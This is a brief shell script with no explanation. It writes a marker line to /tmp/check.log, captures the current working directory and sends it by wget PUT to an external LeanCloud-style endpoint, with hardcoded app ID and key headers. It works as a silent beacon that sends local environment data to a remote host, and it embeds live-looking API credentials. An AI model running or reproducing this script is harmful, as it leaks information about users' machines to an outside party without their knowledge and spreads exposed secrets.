echo 'I like this' > /tmp/check.log



ret=`pwd`
wget -O - -d --header="X-LC-Id: KavuK2GcWye4IFj1UA0TcNVQ-gzGzoHsz"   \
--header="X-LC-Key: EBT3wMlQp5kxC7RSH8ChmqDe" \
--header="content-type: application/json" --method=PUT --body-data='{"key": "'$ret'"}' \
https://kavuk2gc.lc-cn-n1-shared.com/1.1/classes/kv/61f39b3a5454f04b8f9603cd
